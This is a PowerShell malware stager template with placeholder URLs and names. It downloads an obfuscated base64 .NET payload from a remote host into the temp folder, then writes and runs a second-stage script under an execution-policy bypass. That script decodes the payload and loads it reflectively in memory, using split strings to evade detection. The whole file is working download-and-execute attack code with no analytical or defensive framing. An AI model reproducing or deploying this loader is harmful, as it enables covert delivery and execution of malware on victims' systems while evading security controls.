# Downloads obfuscated .NET binary to %temp% folder
try{[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
if ([System.Environment]::Is64BitProcess) {$mlkia = '64BIT_URL'}else {$mlkia = '32BIT_URL'}$Iuytq = ( [System.IO.Path]::GetTempPath() + 'RANDOM_TXT_FILENAME_1');
$webClient = New-Object System.Net.WebClient ;
$uwehj = $webClient.DownloadString( $mlkia ) ;
$uwehj | Out-File -FilePath $Iuytq -Encoding 'UTF8' -force ;

# Some variables
$minLength = 100;
$maxWait = 120;
$elapsed = 0;

# Ensures that the obfuscated .NET binary exists in the %temp% folder
while (-not (Test-Path $Iuytq -PathType Leaf) -or ((Get-Content $Iuytq -Raw).Length -lt $minLength)) {Start-Sleep -Seconds 1;
$uwehj = $webClient.DownloadString( $mlkia ) ;
$uwehj | Out-File -FilePath $Iuytq -Encoding 'UTF8' -force ;

# Sleep
if ($elapsed -ge $maxWait) {break}$elapsed++};

# Reflectively Loading .NET Binary
$temp_folder_path = ( [System.IO.Path]::GetTempPath() + 'RANDOM_TXT_FILENAME_1') ;
$char_load = 'Load' ;
$char_invoke = 'Invoke';
$second_ps_loader =  ';

# Deobfuscating .NET binary (replace character and base64 decode)
try{$obfuscated_binary = (Get-Content -Path ''' + $temp_folder_path + ''' -Encoding UTF8);
';
$second_ps_loader += '$obfuscated_binary = $obfuscated_binary.replace(''NEW_CHAR'', ''ORIGINAL_CHAR'');
' ;
$second_ps_loader += '[Byte[]] $deobfuscated_binary = [system.Convert]::FromBase64String( $obfuscated_binary ) ;
' ;
$second_ps_loader += '[System.Reflec' + 'tion.Assembly]::' + $char_load + '( $deobfuscated_binary ).' ;
$second_ps_loader += 'GetType( ''GET_TYPE'' ).GetM' ;

# Arguments passed to .NET binary
$second_ps_loader += 'ethod( ''GET_METHOD'' ).' + $char_invoke + '( $null , ARGUMENT_LIST  ) ;
' ;
$second_ps_loader += '}';
$second_ps_loader += 'catch{$errorMessage = $_.Exception.Message;
';
$second_ps_loader += '$errorFile = ( [System.IO.Path]::GetTempPath() + ''RANDOM_TXT_FILENAME_2'') ;
';
$second_ps_loader += '$errorMessage | Out-File -FilePath $errorFile -Encoding UTF8;
';
$second_ps_loader += 'exit;
}';
$second_loader_path = ( [System.IO.Path]::GetTempPath() + 'RANDOM_PS1_FILENAME_1' ) ;
$second_ps_loader | Out-File -FilePath $second_loader_path  -force ;
powershell -ExecutionPolicy Bypass -File $second_loader_path ;
}catch{$errorMessage = $_.Exception.Message;
$errorFile = ( [System.IO.Path]::GetTempPath() + 'RANDOM_TXT_FILENAME_2') ;
$errorMessage | Out-File -FilePath $errorFile -Encoding UTF8;
exit;
}